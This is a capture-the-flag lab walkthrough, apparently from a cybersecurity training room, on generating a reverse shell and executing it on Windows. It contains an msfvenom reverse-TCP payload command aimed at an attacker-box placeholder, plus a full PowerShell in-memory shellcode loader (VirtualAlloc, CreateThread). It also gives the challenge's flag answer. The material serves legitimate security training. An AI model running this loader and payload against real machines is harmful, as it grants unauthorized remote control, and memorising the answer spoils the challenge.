<h1>Learning Objectives</h1>
<li>Grasp the fundamentals of writing shellcode.</li>
<li>Generate shellcode for reverse shells.</li>
<li>Executing shellcode with PowerShell.</li>


<p align="center"><img src="https://github.com/user-attachments/assets/a06da095-f46f-4591-b00c-48ca63181822"/></p>

<p>Glitch has realised he's no longer receiving incoming connections from his home base. Mayor Malware's minion team seems to have tampered with the shellcode and updated both the IP and port, preventing Glitch from connecting.</p>
<p>Can you help Glitch identify and update the shellcode with the correct IP and port to restore the connection and reclaim control?</p>



<p><h2>Q1: What is the flag value once Glitch gets reverse shell on the digital vault using port 4444?</h2></p>

<details>
  <summary>Q1 Walkthrough</summary>
    <p>Open a Terminal and enter the command msfvenom -p windows/x64/shell_reverse_tcp LHOST=(ATTACKBOX_IP) LPORT=4444 -f powershell to generate the shellcode</p>
      <img src="https://github.com/user-attachments/assets/96cef443-488e-481e-b3c5-abac26272085"/>
    <p>Execute the following command to open port 4444 and listen for connections</p>
      <img src="https://github.com/user-attachments/assets/8cf8dc42-f338-44d6-bee0-ac328b5ca51b"/>
    <p>Create a new file and paste the following PowerShell Script into it</p>

<p>$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread   

[Byte[]] $buf = (SHELLCODE_PLACEHOLDER)
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")</p>
      <img src="https://github.com/user-attachments/assets/5c7f67e2-737e-437c-b25c-622b78db751f"/>
    <p>Replace part labeled (SHELLCODE_PLACEHOLDER) with shell code previously created with msfvenom</p>
      <img src="https://github.com/user-attachments/assets/78a5f2fd-c03c-45fa-ad3c-cd24fa6ab26f"/>
    <p>Open PowerShell and execute the first half of the code from the document as such</p>
      <img src="https://github.com/user-attachments/assets/4087ed57-fe77-4571-b469-708bb010af32"/>
    <p>Open PowerShell and execute the last four lines of code one-by-one</p>
      <img src="https://github.com/user-attachments/assets/1a1041bf-cd87-4deb-8c93-03500af84ee2"/>
    <p>Verify the reverse shell was complete in the AttackBox</p>
      <img src="https://github.com/user-attachments/assets/eed55ff9-f08b-4628-be46-c44e6bdec14d"/>
    <p>Change directories to Desktop and open the txt file</p>
      <img src="https://github.com/user-attachments/assets/ea9cc931-56a6-4811-b99d-fcd2639b6ce7"/>
 <details> 
  <summary>Q1 Answer</summary>
   <p><b>AOC{GOT _MY_ACCESS_B@CK007}</b>
    <p><img src="https://github.com/user-attachments/assets/c3e4e3d2-c421-4cb4-9aba-efebe735d5c2"/></details>
</details>
